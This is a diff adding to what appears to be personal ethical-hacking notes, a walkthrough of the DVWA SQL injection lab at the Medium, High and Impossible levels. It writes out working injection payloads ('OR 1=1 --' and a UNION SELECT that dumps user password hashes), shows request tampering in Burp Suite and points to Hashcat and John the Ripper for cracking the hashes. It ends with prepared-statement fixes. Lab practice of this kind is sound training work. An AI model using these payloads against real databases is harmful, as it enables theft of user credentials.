@@ -72,6 +72,8 @@ SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_na
 
 </div>
 
+We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).
+
 Note: Every `SELECT` statement within `UNION` must have the same number of columns.
 
 {% hint style="warning" %}
@@ -80,7 +82,7 @@ The input is not sanitized, so I can execute any (potentially malicious) command
 
 ## Medium
 
-
+Here, there're a select with range (1 to 5) to set User ID.
 
 <div align="left">
 
@@ -88,37 +90,113 @@ The input is not sanitized, so I can execute any (potentially malicious) command
 
 </div>
 
-
+In addition to low level, in the code below there're an escape string control and query variable $ID isn't enclosed by ''.
 
 <figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
 
+Our request include an ID + Submit values.
 
+<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
 
+But, we can modify ID value using Burp Suite repeater function:
 
+<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
 
+#### 1st Payload
 
+Remembering that $ID variable isn't enclosed by '', escape string control isn't a matter.
+
+Then in this case, we can use following payload: `1 OR 1=1 --`&#x20;
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1 -- ;
+```
+
+in the where condition there're a first search to user with this id '' OR a true condition, plus a comment.
+
+<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
+
+#### 2nd Payload
+
+How the low level, regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  1 `UNION select first_name,password from users --`&#x20;
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT first_name,password FROM users -- ';
+```
+
+<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
+
+We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).
+
+Note: Every `SELECT` statement within `UNION` must have the same number of columns.
+
+{% hint style="warning" %}
+The input is not sanitized, so I can execute any (potentially malicious) command.
+{% endhint %}
 
 ## High
 
-
-
-
+In this level clicking on first page, we obtain a redirect to a second page to submit effectively our Session ID:
 
 <figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
 <figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
 
+<div align="left">
 
+<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
 
+</div>
 
+#### 1st Payload
+
+In this case payload is always the same of low level, but we need to add it into second page.
+
+Then in this case, we can use following payload: `' OR 1=1 --`&#x20;
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '' OR 1=1 -- ';
+```
+
+This permit us to see all DB results:
+
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+#### 2nd Payload
+
+Regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql\_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_name,password FROM users -- ';
+```
+
+<div align="left">
+
+<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).
+
+Note: Every `SELECT` statement within `UNION` must have the same number of columns.
+
+{% hint style="warning" %}
+The input is not sanitized, so I can execute any (potentially malicious) command.
+{% endhint %}
 
 ## Impossible
 
+<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
 
+
+
+The best solution is to sanitize query using a prepared statement, to delineate part static and dinamic (id) of query; take a binding parameter to check if is it an integer or char; insert a control to count rows number as result; and use a [CSRF](csrf.md) token.
+
+All this permits to separate sql code with sql data/parameter insert by user.
 
 ## References
 
